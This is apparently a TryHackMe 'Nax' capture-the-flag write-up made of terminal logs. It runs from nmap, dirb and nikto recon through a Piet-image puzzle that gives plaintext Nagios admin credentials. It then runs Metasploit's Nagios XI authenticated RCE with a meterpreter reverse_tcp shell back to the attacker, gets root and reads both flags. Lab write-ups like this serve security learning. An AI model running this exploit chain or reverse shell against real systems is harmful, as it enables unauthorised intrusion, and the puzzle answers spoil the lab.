@@ -1,0 +1,273 @@
+IP: 10.10.143.202
+
+Nmap scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 10.10.143.202
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 14:23 IST
+Nmap scan report for 10.10.143.202
+Host is up (0.14s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
+|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
+|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2020-03-23T23:42:04
+|_Not valid after:  2030-03-21T23:42:04
+|_ssl-date: TLS randomness does not represent time
+80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
+| Not valid before: 2020-03-24T00:14:58
+|_Not valid after:  2030-03-22T00:14:58
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/8%OT=22%CT=1%CU=33662%PV=Y%DS=2%DC=T%G=Y%TM=5FA7B24
+OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SEQ
+OS:(SP=100%GCD=1%ISR=10E%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O
+OS:3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2=
+OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSN
+OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Downloads# dirb http://10.10.143.202
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Nov  8 14:23:57 2020
+URL_BASE: http://10.10.143.202/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.143.202/ ----
++ http://10.10.143.202/cgi-bin/ (CODE:403|SIZE:278)                                                                     
++ http://10.10.143.202/index.html (CODE:200|SIZE:1332)                                                                  
++ http://10.10.143.202/index.php (CODE:200|SIZE:2968)                                                                   
+==> DIRECTORY: http://10.10.143.202/javascript/                                                                         
++ http://10.10.143.202/nagios (CODE:401|SIZE:460)                                                                       
++ http://10.10.143.202/server-status (CODE:403|SIZE:278)
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nax# nikto -h 10.10.143.202
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.143.202
++ Target Hostname:    10.10.143.202
++ Target Port:        80
++ Start Time:         2020-11-08 14:24:04 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Server may leak inodes via ETags, header found with file /, inode: 534, size: 5a1a5b9ce3fa2, mtime: gzip
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Multiple index files found: /index.php, /index.html
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+
+
+
+
+
+We have got some elements and we can check the atomic number of that.
+We can then convert the ascii to text to see what we can get.
+
+        Welcome to elements.
+Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
+
+47 80 73 51 84 46 80 78 103
+
+/PI3T.PNg
+
+Cool lets download that file.
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Nax# exiftool PI3T.PNg
+ExifTool Version Number         : 12.06
+File Name                       : PI3T.PNg
+Directory                       : .
+File Size                       : 959 kB
+File Modification Date/Time     : 2020:03:25 09:30:15+05:30
+File Access Date/Time           : 2020:11:08 14:01:15+05:30
+File Inode Change Date/Time     : 2020:11:08 14:01:15+05:30
+File Permissions                : rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 990
+Image Height                    : 990
+Bit Depth                       : 8
+Color Type                      : Palette
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Palette                         : (Binary data 768 bytes, use -b option to extract)
+Transparency                    : (Binary data 256 bytes, use -b option to extract)
+Artist                          : Piet Mondrian
+Copyright                       : Piet Mondrian, tryhackme 2020
+Image Size                      : 990x990
+Megapixels                      : 0.980
+
+
+1) What hidden file did you find?
+-> PI3T.Png
+
+2) Who is the creator of the file?
+-> Piet Mondrian
+
+
+https://www.bertnase.de/npiet/npiet-execute.php
+
+nagiosadmin%n3p3UQ&9BjLp4$7uhWdY
+
+Username:nagiosadmin
+Password:n3p3UQ&9BjLp4$7uhWdY
+
+3) What is the username you found?
+-> nagiosadmin
+
+4) What is the password you found?
+-> n3p3UQ&9BjLp4$7uhWdY
+
+5) What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
+->
+
+
+
+Version: Nagios 5.5.6
+
+msf6 > use 0
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > options
+
+Module options (exploit/linux/http/nagios_xi_authenticated_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to NagiosXI
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   USERNAME   nagiosadmin      yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Linux (x64)
+
+
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set lhost tun0
+lhost => 10.9.81.62
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set rhosts 10.10.143.202
+rhosts => 10.10.143.202
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set password n3p3UQ&9BjLp4$7uhWdY
+
+
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set targeturi /
+targeturi => /
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > run
+
+[*] Started reverse TCP handler on 10.9.81.62:4444
+[*] Found Nagios XI application with version 5.5.6.
+[*] Uploading malicious 'check_ping' plugin...
+[*] Command Stager progress - 100.00% done (897/897 bytes)
+[+] Successfully uploaded plugin.
+[*] Executing plugin...
+[*] Waiting for the plugin to request the final payload...
+[*] Sending stage (3008420 bytes) to 10.10.143.202
+[*] Meterpreter session 1 opened (10.9.81.62:4444 -> 10.10.143.202:33532) at 2020-11-08 14:28:18 +0530
+[*] Deleting malicious 'check_ping' plugin...
+[+] Plugin deleted.
+
+meterpreter > sysinfo
+Computer     : 10.10.143.202
+OS           : Ubuntu 16.04 (Linux 4.4.0-176-generic)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+
+meterpreter > shell
+Process 10526 created.
+Channel 1 created.
+python3 -c "import pty;pty.spawn('/bin/bash')"
+root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+Wew we are already root,thats cool.
+
+root@ubuntu:/home# cd galand
+ls -cd galand
+root@ubuntu:/home/galand# la
+ls -la
+total 56
+drwxr-xr-x 8 galand galand 4096 Mar 24  2020 .
+drwxr-xr-x 3 root   root   4096 Mar 23  2020 ..
+-rw------- 1 root   root    481 Mar 24  2020 .bash_history
+-rw-r--r-- 1 galand galand  220 Mar 23  2020 .bash_logout
+-rw-r--r-- 1 galand galand 3771 Mar 23  2020 .bashrc
+drwx------ 2 galand galand 4096 Mar 23  2020 .cache
+drwxr-xr-x 6 root   root   4096 Mar 23  2020 .cpan
+drwx------ 2 root   root   4096 Mar 23  2020 .gnupg
+drwxrwxr-x 2 galand galand 4096 Mar 24  2020 .nano
+-rw-r--r-- 1 galand galand  655 Mar 23  2020 .profile
+-rw------- 1 root   root   1024 Mar 23  2020 .rnd
+drwxr-xr-x 3 root   root   4096 Mar 23  2020 .subversion
+-rw-r--r-- 1 galand galand    0 Mar 23  2020 .sudo_as_admin_successful
+drwxr-xr-x 9 galand galand 4096 Mar 23  2020 nagiosxi
+-rw-rw-r-- 1 galand galand   38 Mar 24  2020 user.txt
+root@ubuntu:/home/galand# cat user.txt
+cat user.txt
+THM{84b17add1d72####################}
+root@ubuntu:/home/galand#
+
+
+root@ubuntu:/home/galand# cd /root
+cd /root
+root@ubuntu:~# ls
+ls
+root.txt  scripts
+root@ubuntu:~# cat root.txt
+cat root.txt
+THM{c89b2e39c8##################2}
+root@ubuntu:~#
